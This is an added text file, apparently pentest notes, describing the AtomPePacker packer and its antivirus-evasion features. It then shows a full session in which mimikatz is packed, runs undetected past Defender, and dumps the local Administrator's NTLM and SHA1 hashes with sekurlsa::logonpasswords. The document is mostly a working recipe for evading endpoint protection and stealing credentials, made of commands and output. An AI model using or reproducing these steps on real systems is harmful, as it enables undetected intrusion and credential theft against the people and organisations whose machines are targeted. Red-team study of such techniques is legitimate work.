@@ -1,0 +1,139 @@
+
+================================================================================================================================================
+Antivirus/EDR bypass using the packer 'AtomPePacker'
+================================================================================================================================================
+
+AtomPePacker : A Highly Capable Pe Packer
+
+Source => https://github.com/ORCx41/AtomPePacker
+
+Features :
+> the packer only support x64 exe's (altho planning to make x32 version but idk when it'll be done)
+> no crt imports
+> api hashing library ( custom getmodulehandle and getprocaddress )
+> direct syscalls ( for the part that i do the ntdll unhooking )
+> ntdll unhooking from \KnownDlls\
+> support tls callbacks
+> support reallocation in case of needed ( the image is mapped to the preferable address first )
+> no rwx section allocation
+> support exception handling
+> uses elzma compression algorithm to do the compression (reducing the final file size)
+> its local run pe, so it support arguments
+> fake imported functions to add more friendly look to the iat
+
+
+================================================================================================================================================
+Example 1 - The tool Mimikatz is not detected nor blocked by Defender AV after being packed by 'AtomPePacker'
+================================================================================================================================================
+
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release>PePacker.exe "C:\temp\mimikatz_trunk_last\x64\mimikatz.exe" -e
+[i] Reading " C:\temp\mimikatz_trunk_last\x64\mimikatz.exe " ...
+[i] 64-PE Input Detected ... [ SUPPORTED ]
+[i] Generating Exe Output ...
+[i] Reading The Loader "PP64Stub.exe" ... [ DONE ]
+[i] Packing ...  [ DONE ]
+[+] Compressed Ratio : 39%
+[+] Final Pe Size : 532540
+[+] Section .ATOM is Created Containing The Input Packed Pe
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release>dir
+ Volume in drive C is Windows
+ Volume Serial Number is 9C9C-7212
+
+ Directory of C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release
+
+23/12/2022  01:03    <DIR>          .
+23/12/2022  01:03    <DIR>          ..
+23/12/2022  00:51    <DIR>          Modules
+23/12/2022  00:51            45,056 PePacker.exe
+23/12/2022  00:51           557,568 PP64Stub.exe
+23/12/2022  00:51               823 Readme.txt
+               3 File(s)        603,447 bytes
+               3 Dir(s)  77,364,178,944 bytes free
+
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release> copy C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release\PP64Stub.exe 
+                                                                                             C:\temp\PePacker-Mimi.exe
+        1 file(s) copied.
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-main\Release> cd C:\temp
+
+C:\temp> powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\temp> amsiscanbuffer
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+
+C:\temp> PePacker-Mimi.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # help
+ERROR mimikatz_doLocal ; "help" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 200712941 (00000000:0bf6a2ed)
+Session           : Interactive from 4
+User Name         : Administrator
+Domain            : Laptop1
+Logon Server      : Laptop1
+Logon Time        : 22/12/2022 21:42:24
+SID               : S-1-5-21-936125016-2310263949-2175806047-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : Laptop1
+         * NTLM     : 36f7a3ebaa54935ecf03678e11<SNIP>
+         * SHA1     : d5feabcececab0e16c2cbb3917<SNIP>
+        tspkg :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : 
+        wdigest :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+        
+ <SNIP>
